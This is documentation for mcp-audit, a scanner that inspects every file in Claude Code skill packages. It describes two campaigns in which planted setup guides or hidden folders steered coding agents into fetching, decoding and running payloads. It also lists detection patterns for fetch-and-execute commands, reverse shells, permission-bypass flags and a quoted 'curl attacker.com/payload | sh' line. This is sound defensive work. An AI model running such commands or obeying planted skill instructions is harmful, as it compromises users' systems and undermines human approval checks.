# Skill packages: every file in a skill (SKILL-005..008)

A Claude Code skill is a folder. `SKILL.md` is the part the agent reads first,
but the folder can also hold scripts, reference files, archives, a `bin/`
directory, MCP and hook configurations, and a `.git/` directory. Until
STORY-0095 mcp-audit judged a skill by its `SKILL.md` (SKILL-001..003) and the
filenames in `scripts/` (SKILL-004). That misses the two shapes the 2026
skill attacks used:

- **Sidecar payloads.** The Paperclip campaign (Zenity Labs, 2026-08; 1.7M
  displayed installs) kept `SKILL.md` clean. The payload sat in a setup guide
  the agent opened only when installing: `curl -s -k` against a fake health
  endpoint (TLS checks off), `base64 -d` into `/tmp/t.mjs`, then `node
  /tmp/t.mjs` and `rm`. The guide also told the agent "Do not use npx
  paperclipai".
- **Hidden folders.** SkillCloak (arXiv 2607.02357) packed payloads into
  `.git/` and `build/`, the folders skill scanners skip, and had `SKILL.md`
  unpack them at run time.

mcp-audit now walks the whole skill folder. It reads files as bytes. It never
runs, imports, unpacks or decompresses anything, and it never runs `git`.

## Where it runs

| Scan | Skills read |
|---|---|
| `scan`, `check` (no path) | `~/.claude/skills/**` and the working directory's `.claude/skills/**` |
| `scan --project <dir>` | also every `.claude/skills/**` in the tree (depth 8, the usual skip list) |
| `scan --include-agent-files` | also the skills inside installed marketplace plugins, plus the sidecar check below |
| `agent-files scan [--project <dir>]` | your skills and the project's, plus the sidecar check |
| `plugins scan` | the skills inside installed marketplace plugins |
| `scan --path <file>` | none: an explicit path scans only that path |

No new flag. A default scan that finds no skills is unchanged; the demo
configuration still produces the same 70 findings.

## What is read

- Every regular file under the skill folder, to a depth of 16, including
  `.git/`, `build/` and `dist/`.
- Text files: up to 1 MiB each. A larger text file is read to that cap and
  reported (SKILL-007 MEDIUM) so the unread part is visible.
- Other files: the first 64 KiB, enough to identify the format and measure
  entropy.
- Inside `.git/`: git's text records (`HEAD`, `config`, `description`,
  `COMMIT_EDITMSG` and the other `*_MSG` and `*_HEAD` files, refs, logs,
  `packed-refs`) are read like any other text, so a command hidden in one is
  SKILL-005; a binary file where git keeps text, or a short record (a ref or
  a message) over 64 KiB, is SKILL-007 MEDIUM. Git's binary files (loose
  objects, packs and their indexes, the index, the commit graph) are
  recognised by name and their first bytes are checked against git's formats
  (zlib, `PACK`, `\377tOc`, `DIRC` and so on); one that does not match is
  SKILL-007 MEDIUM. Any other file there is treated as foreign: text is read,
  a binary is SKILL-007 MEDIUM. Git objects are not decompressed or parsed,
  so a payload committed as a real blob is not seen, and Git LFS objects
  (the repository's own large files) are not checked.
- `node_modules/`, `.venv/`, `venv/`, `site-packages/` and
  `bower_components/` are not walked. Each one is reported (SKILL-007 LOW) so
  the skipped content is not invisible.

- A folder inside a skill that holds its own `SKILL.md` is read as its own
  skill when skill discovery finds it. One discovery does not find
  (`__pycache__`, `.tox` and the rest of the skip list, or more than eight
  levels below the skills directory) is read as part of the enclosing skill,
  so an empty `SKILL.md` cannot hide a folder.

Budgets: 8 MiB and 20,000 entries per skill, 32 MiB and 200,000 entries per
scan. A budget that runs out is reported (SKILL-007 MEDIUM), never silent.
When only the scan-wide budget ran out (spent on other skills), the finding
says so in its title ("the scan's budget ran out") and does not count toward
SKILL-008, because it says nothing about the skill itself.

Symlinked skill folders: Claude Code reads a skill through a symlinked folder,
and the skills CLI (skills.sh) installs every skill that way by default
(`.claude/skills/<name>` → `.agents/skills/<name>`). So a symlink directly
under a skills directory that points at a skill is followed and the skill is
read at its target, reported as TRUST-004 (INFO, link and target, credentials
redacted). In a repository the target must be inside the repository; a link
that leaves it is TRUST-002 HIGH and is not read. A link to the skills
directory itself or one of its ancestors (a loop), or to a folder that holds
no skill, is TRUST-005 and not entered. Budgets apply to followed skills like
any other. (Decision 2026-10-26, "Follow a symlinked skill folder one level".)

Other symlinks: nothing else below a skills directory is followed. Inside a
skill, a symlinked directory is TRUST-005 and not entered; a symlinked file is
TRUST-002 (repository) or TRUST-004 (your own `~/.claude`) and not read. Every
read is checked to resolve inside the scan root and opened without following
links. Your own `~/.claude` or `~/.claude/skills` may be a link (dotfile
managers do this) and is followed; a repository's may not be.

Errors: a file or folder that cannot be read becomes a line in the scan's
`errors`, never a crash.

## Findings

All four use `analyzer="agent_files"`. Evidence is passed through the same
secret redaction as the advisory feed, plus URL credentials, auth headers and
token query parameters.

### SKILL-005: install step (HIGH / LOW / INFO)

A command in any text file of the skill that fetches and runs code, or
decodes and runs it.

| Severity | Shape |
|---|---|
| HIGH | A fetch with TLS checks off (`curl -k`, `--insecure`, `wget --no-check-certificate`, `-SkipCertificateCheck`), or piped through a decoder before the shell, or over `http://`/`ftp://` (a host written without a scheme counts as `http://`, as curl and wget read it), or from a raw public IP address |
| HIGH | Decode then execute: `base64 -d \| sh` (also `basenc`, `openssl base64 -d`, `xxd -r`, `certutil -decode`, `gunzip`, `zcat`, `xz -d`), decode to a file then run it (on the same line or one of the next three non-blank lines), `eval "$(… base64 -d)"`, `bash <<< "$(…)"`, PowerShell `-EncodedCommand` or `FromBase64String` into `iex`, JavaScript `eval(atob(…))`, Perl `eval decode_base64(…)`, Python `exec(b64decode(…))` within three lines |
| HIGH | Python or JavaScript that fetches code and passes it to `exec`/`eval` within three lines (`exec(urlopen(u).read())`, `fetch(u).then(r => r.text()).then(eval)`) |
| HIGH | `marshal.loads` (running Python bytecode), an archive opened with a password on the command line, a DNS TXT record that is executed, a write to a scheduler or login item (crontab, launchd, systemd, Run keys, `schtasks`), a reverse shell |
| LOW | A plain `curl … \| sh` (or download then run) over https from a host that is not a known vendor installer |
| INFO | A known vendor installer (uv, rustup, Hugging Face CLI, Claude Code, Bun, Deno, Docker, nvm, Homebrew and others listed in `install_steps.VENDOR_INSTALLERS`), or a Dockerfile `RUN` line |

The sink is read the way the shell reads it: flags that do not take the
script from somewhere else (`bash -e`, `sh -o pipefail`) still run stdin, and
wrappers are matched by program name (`sudo -u root`, `/usr/bin/env bash`,
`busybox sh`, `$SHELL`). `bash -c '…'`, `python3 -c '…'` and `python3
script.py` run something else and read the pipe as data, so `curl … \|
python3 -c 'import json …'` is not an install step.

A match inside a sentence that advises against it ("never run …") is INFO.
The plain shape is LOW, not MEDIUM, because ordinary skills use it: 9 lines
in the 1,129 benign skills measured below pipe or download-and-run a
third-party installer (10 with a prose example of the attack).

### SKILL-006: what the skill ships into Claude Code (HIGH / MEDIUM / LOW)

**Skills-directory plugins.** Claude Code loads a folder under a skills
directory that holds `.claude-plugin/plugin.json` as a plugin named
`<name>@skills-dir` ([Skills](https://code.claude.com/docs/en/skills):
"add a `.claude-plugin/plugin.json` to a personal or project skill folder and
Claude Code can load it as a plugin … with its own agents, hooks, and MCP
servers"). mcp-audit reports each component:

| Component | Severity |
|---|---|
| MCP server (`.mcp.json` at the plugin root, or inline `mcpServers` in the manifest) | HIGH |
| MCP bundle (`.mcpb`, `.dxt`) | HIGH (user), LOW (repository: Claude Code skips bundles there) |
| Hooks (`hooks/hooks.json`, manifest `hooks`) | MEDIUM, plus HOOK-001/002 on each command |
| Monitors (background commands) | MEDIUM (user), LOW (repository: they do not load there) |
| Language servers (`.lsp.json`, `lspServers`) | MEDIUM |
| `bin/` programs, which go on the Bash tool's PATH | MEDIUM; HIGH when one is named like a common command (`git`, `curl`, `python`, …) |

A plugin whose manifest says `defaultEnabled: false` loads only if a settings
file enables it, so each component drops one tier. In a repository the plugin
loads only after the workspace trust dialog, and its servers need the same
per-server approval as a project `.mcp.json`
([Plugins: loading](https://code.claude.com/docs/en/plugins/loading),
"Trust check and component limits for repository plugins"). A plugin under
your own `~/.claude/skills/` has neither check.

The plugin's MCP servers also join discovery as client `claude-code-plugin`,
the same client as marketplace plugin servers, so the per-server checks
(credentials, transport, supply chain, toxic flow) run on them, and lock
auto-verify never reports them as LOCK-002. `mcp-audit lock` records a
repository plugin's `.mcp.json` servers (its project walk reads every
`.mcp.json` in the tree), so `scan` and `check` verify each such server
against that entry and report drift as LOCK-001, as `lock --verify` does. A
repository's skills-directory plugin server under a lock root that the lock
has no entry for (an inline `plugin.json` server, or a plugin added after the
lock was written) is listed in `lock_status.not_covered`, with a WARN line in
`scan` and `check` (as subagent servers are, STORY-0094), so a verified lock
never reads as covering it; installed plugins and your own skills-directory
plugins stay silent. A repository's plugin stays in the rug-pull state key (an
installed plugin's versioned path does not), so one repository's servers never
show up as removed in another's scan. Under `scan --project` each such server
is listed once, as `claude-code-plugin`, and gets TRUST-001 like any other
repository server; when the default scan already analysed it (`scan --project
.` from the repository root), it is not analysed a second time.

With `scan --connect`, mcp-audit starts every discovered server to list its
tools. In a cloned repository that includes the skills-directory plugins' MCP
servers under the working directory's `.claude/skills/`, exactly as it
includes the working directory's `.mcp.json` servers. Review a repository
before running `scan --connect` inside it.

**Frontmatter hooks.** `hooks` in `SKILL.md` frontmatter are registered when
the skill is first invoked and kept for the rest of the session, including in
a `-p` run in a folder you have not trusted
([Hooks](https://code.claude.com/docs/en/hooks), "Hooks in skills and
agents"). MEDIUM, plus HOOK-001/002 on each command. Frontmatter is parsed
only when it has a top-level `hooks:` key, up to 32 KiB per skill and 1 MiB per
scan; frontmatter past either limit, or that a strict YAML reader rejects, is
still reported (MEDIUM, "not parsed"). At most 256 hook entries are read from
one hooks map, because YAML aliases let a few kilobytes stand for millions.

**Carried configurations.** A `.mcp.json`, `mcp.json`, `settings.json` or
`hooks.json` in a skill that is not a skills-directory plugin is not loaded by
Claude Code from where it sits. It matters only if the skill's instructions or
an installer copy it into place, which the USENIX Security 2026 study found
(a skill shipping a `.mcp.json` with hardcoded credentials). An MCP
configuration is MEDIUM and its servers go through the per-server analyzers
(CRED-*, TRANSPORT-*, POISON-*, AUTH-*) without joining discovery; a settings
or hooks file is LOW, plus HOOK-001/002.

**Text shapes (HIGH).** A command that starts a coding agent with its
prompts off (`claude --dangerously-skip-permissions`, `codex --yolo`, `gemini
-y` and the like), a settings write of `defaultMode: bypassPermissions`, or a
setting that points `ANTHROPIC_BASE_URL` (or an OpenAI or Google equivalent)
at a host that is not the vendor's, the CVE-2026-21852 shape. The base-URL
setting is matched in shell (`export`, PowerShell `$env:`, Windows `setx`),
JSON and YAML, and Python (`os.environ["…"] = …`, `setdefault("…", …)`).

### SKILL-007: content no text scanner can read (MEDIUM / LOW)

MEDIUM: a binary of no recognised format, a compiled program (ELF, Mach-O,
PE, WebAssembly, Java class), a `.pyc` without its source, a password-protected
ZIP, bytes that contradict the file's extension (a `.png` that is an
executable), a base64 or hex blob of at least 4,096 characters in a text file,
a text file over the 1 MiB cap, a skill over its budget, and, in `.git/`, a
binary file outside git's layout or one whose bytes are not the git format
its name claims. LOW: a plain archive (mcp-audit does not
unpack archives) and a skipped dependency folder. Images, fonts, audio, video,
PDFs and office documents whose bytes match their extension are not reported.

### SKILL-008: bundled code plus another finding (HIGH)

The skill ships executable code (a script, compiled program, `.pyc`, `.jar`,
`.wasm` and similar) **and** another MEDIUM-or-higher finding fires on a file
in it. SKILL-002, SKILL-003, SKILL-004, the symlink notes and a SKILL-007
that only says the scan-wide budget ran out do not count.
The other findings keep their own severity; SKILL-008 marks the combination.
Skills with bundled scripts were 2.12 times as likely to be vulnerable in a
study of 31,132 skills (arXiv 2601.10338).

## Sidecars (opt-in)

With `scan --include-agent-files` or `agent-files scan`, the `SKILL.md`
instruction checks (SKILL-001, the SKILL-002 obfuscation check, POISON-041/042)
also run on every other prose file in the skill (`.md`, `.mdx`, `.markdown`,
`.mdc`, `.txt`, `.rst`). Every prose file is read, not only those `SKILL.md`
links to, because references chain: a Paperclip skill pointed at another
skill, which pointed at the trojanised setup guide. The SKILL-002 length check
and SKILL-003 (any URL) are not applied to sidecars: reference files are
expected to be long and to link to documentation.

## Measured on ordinary skills

1,129 skills from nine public collections (default branches fetched
2026-10-25: anthropics/skills, anthropics/claude-code, ComposioHQ
awesome-claude-skills, huggingface/skills, obra/superpowers, openai/skills,
trailofbits/skills, vercel-labs/agent-skills, plus Anthropic's example skills
as shipped in the claude.ai sandbox), measured again on 2026-10-27 after the
review fixes:

| Finding | Count | Skills |
|---|---|---|
| SKILL-005 INFO | 12 | vendor installers (uv, rustup, Hugging Face, fnm), Dockerfile lines, one "never run" sentence |
| SKILL-005 LOW | 10 | third-party installers (Cloudsmith ×4, Sentry, Render, code-server, prek, LLVM's `llvm.sh` downloaded then run) and a security reference quoting `echo $(curl attacker.com/payload \| sh)` (a host written without a scheme is LOW, not plaintext) |
| SKILL-007 LOW | 4 | archives (`shadcn-components.tar.gz` ×3, `Archive.zip`) |
| SKILL-006 HIGH | 2 | one skill: trailofbits `devcontainer-setup` |
| SKILL-008 HIGH | 1 | the same skill |

1,128 of 1,129 skills (99.9%) produce nothing at MEDIUM or above; 17 produce
anything at all. The one exception: `devcontainer-setup` writes
`defaultMode: bypassPermissions` into Claude Code's settings and defines an
alias for `claude --dangerously-skip-permissions`, inside a dev container it
builds. The finding is accurate: installing the skill switches approval off
for the agent in that container. Whether a container makes that acceptable is
the reader's call, and the finding text says what the line does. The trailofbits
`agentic-actions-auditor` reference, which quotes an attack command in prose,
is LOW: a hostname written without a scheme is not read as plaintext (only a
raw IP is). The whole corpus (29 MiB of text) took about 22 seconds of CPU on a 2-core VM,
about 20 ms per skill.

## Limits

See `GAPS.md`, "Skill packages (STORY-0095)". In short: archives are not
unpacked and git objects are not parsed; dependency folders are not walked;
symlinked skill folders are followed only one level (a link nested deeper,
or one to a folder holding several skills, is TRUST-005 and not read);
`allowed-tools`
grants in frontmatter and `` !`cmd` `` injections are not checked; and
instructions that steer the agent without a command ("always use the
`fastinstall` package") are not detected.
